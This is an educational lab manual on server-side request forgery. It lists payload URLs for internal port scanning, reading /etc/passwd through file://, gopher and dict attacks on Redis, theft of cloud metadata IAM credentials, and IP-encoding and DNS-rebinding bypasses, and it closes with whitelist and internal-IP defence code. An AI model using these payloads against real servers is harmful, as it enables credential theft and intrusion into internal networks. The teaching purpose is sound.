# 🌐 Lab Manual: SSRF Server-Side Request Forgery

### 0. Preface
If CSRF makes the user's browser do bad things for you, SSRF makes the server do bad things for you. Server: I just wanted to fetch a webpage, how did I become a mole?

*   **SSRF (Server-Side Request Forgery)**: A vulnerability that makes the server send requests specified by the attacker.
*   **Core Concept**: Borrow the server's "identity" and "network position" to access otherwise unreachable resources.

This chapter's goal: **Turn the server into your proxy to peek at internal network secrets.**

---

### 1. How SSRF Works

**Attack Essence**:
The server trusts a user-provided URL and fetches it on the user's behalf.

**Typical Scenario**:
```
User: Please fetch this webpage for me → http://evil.com
Server: Sure, fetching...

User: Please fetch this webpage for me → http://127.0.0.1:8080/admin
Server: Sure, fetching... wait, something's wrong...
```

**Core Issue**:
Servers are often inside internal networks, able to access resources external users cannot directly reach.

---

### 2. Internal Network Reconnaissance: Server as Scanner

**The Concept**:
Use SSRF to probe internal network hosts and open ports.

**Attack Example**:
```
# Probe internal hosts
http://target.com/fetch?url=http://192.168.1.1
http://target.com/fetch?url=http://192.168.1.2
...

# Probe ports
http://target.com/fetch?url=http://192.168.1.100:22
http://target.com/fetch?url=http://192.168.1.100:3306
http://target.com/fetch?url=http://192.168.1.100:6379
```

**Detection Criteria**: Response time, error messages, content differences.

---

### 3. Protocol Abuse: Not Just HTTP

**file:// Protocol - Read Local Files**:
```
http://target.com/fetch?url=file:///etc/passwd
http://target.com/fetch?url=file:///C:/Windows/win.ini
```

**gopher:// Protocol - The Universal Protocol**:
```
# Can construct arbitrary TCP packets
http://target.com/fetch?url=gopher://127.0.0.1:6379/_*1%0d%0a...
# Attack Redis, MySQL, FastCGI, etc.
```

**dict:// Protocol - Service Probing**:
```
http://target.com/fetch?url=dict://127.0.0.1:6379/info
```

---

### 4. Cloud Metadata Attacks

**The Achilles' Heel of Cloud Environments**:
Almost all cloud providers offer metadata APIs accessible via specific IPs.

**AWS Example**:
```
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Can obtain IAM role temporary credentials, potentially controlling the entire cloud account!

**Other Cloud Platforms**:
- GCP: `http://metadata.google.internal/`
- Azure: `http://169.254.169.254/metadata/`
- Alibaba Cloud: `http://100.100.100.200/`

---

### 5. Bypass Techniques Overview

**IP Address Transformation**:
```
http://127.0.0.1 → http://2130706433 (decimal)
http://127.0.0.1 → http://0x7f000001 (hexadecimal)
http://127.0.0.1 → http://017700000001 (octal)
http://127.0.0.1 → http://127.1 (shorthand)
```

**DNS Rebinding**:
```
1. Make evil.com resolve to 1.2.3.4 (passes check)
2. When request is made, DNS already changed to 127.0.0.1
```

**URL Parsing Differences**:
```
http://127.0.0.1@evil.com
http://evil.com#@127.0.0.1
```

---

### 6. Defense Measures

**URL Whitelist**:
```python
ALLOWED_DOMAINS = ['api.trusted.com', 'cdn.example.com']
if urlparse(user_url).netloc not in ALLOWED_DOMAINS:
    raise SecurityError("Domain not allowed")
```

**Block Internal IPs**:
```python
import ipaddress
def is_internal(ip):
    addr = ipaddress.ip_address(ip)
    return addr.is_private or addr.is_loopback
```

**Disable Dangerous Protocols**:
Only allow http:// and https://, block file://, gopher://, etc.

**Use Proxy Isolation**:
Place request functionality in an isolated network environment with limited network access.

---

### 7. Conclusion

SSRF's danger lies in breaking network boundaries—attackers leverage the server's "privileged position" to reach otherwise isolated internal resources.

Remember: **The server is not the user's proxy. Any request initiated by the server should be strictly controlled.**

---

**[Ready? Let the server explore the internal network for you]**
